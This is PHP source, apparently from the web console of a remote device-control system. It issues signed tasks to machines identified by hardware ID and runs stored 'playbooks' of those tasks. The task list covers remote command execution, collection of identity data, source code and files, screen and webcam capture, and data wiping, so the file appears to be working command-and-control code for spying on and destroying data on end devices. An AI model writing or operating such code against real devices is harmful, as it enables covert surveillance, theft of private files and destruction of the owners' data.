<?php
// 任务下发的共用实现：控制台和设备详情页都用它。
// 走 sudo 白名单调 onyx-task —— 签名私钥是 600 root，php-fpm 读不到。
function dispatch_task(string $hwid, string $type, string $params, int $ttl): string {
    $cmd = sprintf(
        'sudo -n /usr/local/bin/onyx-task %s %s %s %d 2>&1',
        escapeshellarg($hwid),
        escapeshellarg($type),
        escapeshellarg($params),
        $ttl
    );
    $out = [];
    $code = 0;
    exec($cmd, $out, $code);
    $text = trim(implode("\n", $out));
    if ($code !== 0) {
        throw new RuntimeException($text !== '' ? $text : "onyx-task 退出码 $code");
    }
    if (!preg_match('/task_id=(tk_[0-9a-f]+)/', $text, $m)) {
        throw new RuntimeException('输出异常: ' . $text);
    }
    return $m[1];
}

const ONYX_TASK_TYPES_WEB = ['ping','collect_identity','exec','collect_src','collect_file',
                             'collect_tree','capture_screen','capture_cam','wipe'];

/**
 * 取所有处置预案。items_json 形如
 *   [{"type":"collect_identity","params":"{}"},{"type":"capture_screen","params":"{}"}]
 * 非法项直接丢掉，不让脏数据下发出危险任务。
 */
function load_playbooks(PDO $pdo): array {
    $out = [];
    try {
        foreach ($pdo->query("SELECT id, name, note, items_json FROM auth_playbooks ORDER BY id") as $r) {
            $items = json_decode((string)$r['items_json'], true);
            if (!is_array($items)) continue;
            $clean = [];
            foreach ($items as $it) {
                $t = (string)($it['type'] ?? '');
                $p = (string)($it['params'] ?? '{}');
                if (!in_array($t, ONYX_TASK_TYPES_WEB, true)) continue;
                if (json_decode($p) === null) $p = '{}';
                $clean[] = ['type' => $t, 'params' => $p];
            }
            if (!$clean) continue;
            $out[] = ['id' => (int)$r['id'], 'name' => $r['name'], 'note' => $r['note'], 'items' => $clean];
        }
    } catch (Throwable $e) {
        return [];
    }
    return $out;
}

/** 执行一个预案，返回 ['ok'=>int,'fail'=>int,'errors'=>[]] */
function run_playbook(PDO $pdo, string $hwid, string $name, int $ttl = 3600): array {
    $res = ['ok' => 0, 'fail' => 0, 'errors' => []];
    $st = $pdo->prepare("SELECT items_json FROM auth_playbooks WHERE name = ? LIMIT 1");
    $st->execute([$name]);
    $items = json_decode((string)$st->fetchColumn(), true);
    if (!is_array($items) || !$items) {
        $res['errors'][] = "预案不存在: {$name}";
        return $res;
    }
    foreach ($items as $it) {
        $t = (string)($it['type'] ?? '');
        $p = (string)($it['params'] ?? '{}');
        if (!in_array($t, ONYX_TASK_TYPES_WEB, true)) { $res['fail']++; continue; }
        try {
            dispatch_task($hwid, $t, $p, $ttl);
            $res['ok']++;
        } catch (Throwable $e) {
            $res['fail']++;
            $res['errors'][] = $t . ': ' . $e->getMessage();
        }
    }
    return $res;
}
